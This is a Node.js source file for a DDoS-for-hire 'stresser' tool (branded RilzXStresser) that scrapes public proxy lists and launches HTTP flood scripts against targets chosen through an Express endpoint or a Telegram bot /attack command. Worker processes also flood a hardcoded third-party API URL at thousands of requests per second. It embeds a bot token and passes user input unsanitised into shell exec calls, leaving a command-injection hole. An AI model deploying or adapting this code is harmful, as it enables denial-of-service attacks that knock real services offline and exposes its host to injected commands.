const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');
const cluster = require('cluster');
const os = require('os');
const fetch = require('node-fetch');
const TelegramBot = require('telegram-bot-api');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 50036;
const numCPUs = os.cpus().length;

const proxyUrls = [
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
  "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
  "https://multiproxy.org/txt_all/proxy.txt",
  "https://rootjazz.com/proxies/proxies.txt",
  "https://api.openproxylist.xyz/http.txt",
  "https://api.openproxylist.xyz/https.txt",
  "https://api.openproxylist.xyz/socks4.txt",
  "https://api.openproxylist.xyz/socks5.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
  "https://spys.me/proxy.txt"
];

const TELEGRAM_BOT_TOKEN = '8332500191:AAFPUFR-3MIftMaf28ewCFshIEmOruA2344'; // Replace with your bot token
const telegram = new TelegramBot({
  token: TELEGRAM_BOT_TOKEN,
  polls: {
    interval: 500,
    timeout: 0
  }
});

async function scrapeProxy() {
  try {
    let allData = "";

    for (const url of proxyUrls) {
      try {
        const response = await fetch(url);
        const data = await response.text();
        allData += data + "\n";
      } catch (err) {
        console.log(`❌ Gagal ambil dari ${url}: ${err.message}`);
      }
    }

    fs.writeFileSync("proxy.txt", allData, "utf-8");
    console.log("Semua proxy berhasil disimpan ke proxy.txt");
  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}

async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}

async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`-> http://${data.origin}:${port}`);
  return data;
}

app.get('/exc', (req, res) => {
  const { target, time, methods } = req.query;

  res.status(200).json({
    message: 'API request received. Executing script shortly, By RilzXStresser',
    target,
    time,
    methods
  });

  if (methods === 'strike') {
    exec(`node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`);
   } else if (methods === 'mix') {
    exec(`node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`);
    exec(`node methods/flood.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'flood') {
    exec(`node methods/flood.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'h2vip') {
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'h2') {
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
   } else if (methods === 'pidoras') {
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
   } else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
  scrapeProxy();
  scrapeUserAgent();
  fetchData();
});

if (cluster.isMaster) {
  console.log(`Master ${process.pid} is running`);

  // Fork workers.
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
    console.log(`Worker ${worker.process.pid} died`);
  });
} else {
  // Workers can share any TCP connection
  // In this case, it is an HTTP server
  const targetUrl = 'https://api.deline.web.id/ai/copilot?text=Sekarang+hari+apa'; // Replace with your target URL
  const requestRate = 5000; // Requests per second
  const concurrency = 2000; // Number of concurrent threads

  function sendRequest() {
    axios.get(targetUrl)
      .then(response => {
        // Handle response if needed
      })
      .catch(error => {
        // Handle error if needed
      });
  }

  function startFlood() {
    for (let i = 0; i < concurrency; i++) {
      setInterval(sendRequest, 1000 / requestRate);
    }
  }

  startFlood();
  console.log(`Worker ${process.pid} started`);
}

telegram.on('message', async (message) => {
  const chatId = message.chat.id;
  const text = message.text;

  if (text.startsWith('/start')) {
    telegram.sendMessage(chatId, 'Welcome! Use /attack <target> <time> <method> to start a DDoS attack.');
  } else if (text.startsWith('/attack')) {
    const parts = text.split(' ');
    if (parts.length !== 4) {
      telegram.sendMessage(chatId, 'Usage: /attack <target> <time> <method>');
      return;
    }

    const target = parts[1];
    const time = parts[2];
    const methods = parts[3];

    exec(`node ./methods/${methods}.js ${target} ${time} 4 90 proxy.txt --full`, (error, stdout, stderr) => {
      if (error) {
        telegram.sendMessage(chatId, `Error: ${error.message}`);
        return;
      }
      telegram.sendMessage(chatId, `Attack started on ${target} for ${time} seconds using ${methods} method.`);
    });
  } else if (text.startsWith('/listatc')) {
    const availableMethods = [
      'strike',
      'mix',
      'flood',
      'h2vip',
      'h2',
      'pidoras'
    ];
    telegram.sendMessage(chatId, `Available attack methods: ${availableMethods.join(', ')}`);
  }
});

console.log('Telegram bot is running...');
